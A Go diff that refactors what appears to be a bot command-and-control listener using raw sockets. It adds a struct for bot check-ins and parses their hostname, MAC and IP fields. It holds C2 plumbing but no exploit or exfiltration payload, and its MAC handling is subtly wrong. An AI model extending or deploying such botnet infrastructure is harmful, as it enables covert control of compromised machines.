@@ -1,8 +1,8 @@
 package main
 
 import (
+	"fmt"
 	"net"
-	"strconv"
 	"strings"
 
 	"github.com/google/gopacket"
@@ -10,6 +10,13 @@ import (
 	"golang.org/x/net/bpf"
 	"golang.org/x/sys/unix"
 )
+
+// Host defines values for a callback from a bot
+type Host struct {
+	Hostname string
+	Mac      net.HardwareAddr
+	IP       net.IP
+}
 
 // sendCommand takes
 func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan string) {
@@ -27,18 +34,14 @@ func processPacket(packet gopacket.Packet, listen chan string) {
 
 	payload := strings.Split(data, " ")
 
-	// Get the type of message
-	typeOfMessage := payload[0]
-
-	if typeOfMessage == "HELLO:" {
-		id, err := strconv.Atoi(payload[1])
-		checkEr(err)
-		hostname := payload[2]
-		mac := payload[3]
-		ip := payload[4]
-	} else {
-		return
+	// New Host struct for shipping info to sendCommand()
+	newHost := Host{
+		Hostname: payload[1],
+		Mac:      net.HardwareAddr(payload[2]),
+		IP:       net.ParseIP(payload[3]),
 	}
+
+	fmt.Println("My host:", newHost)
 }
 
 func main() {
@@ -74,16 +77,16 @@ func main() {
 	defer unix.Close(sendfd)
 
 	// Make channel
-	listen = make(chan string)
+	listen := make(chan string)
 
 	// Iface and src ip for the sendcommand func to use
 	iface, src := cattails.GetOutwardIface("8.8.8.8")
 
 	// Spawn routine to listen for responses
-	go sendCommand(fd, iface, src, listen)
+	go sendCommand(sendfd, iface, src, listen)
 
 	for {
-		packet := cattails.ReadPacket(fd, vm)
+		packet := cattails.ReadPacket(readfd, vm)
 		// Yeet over to processing function
 		if packet != nil {
 			go processPacket(packet, listen)
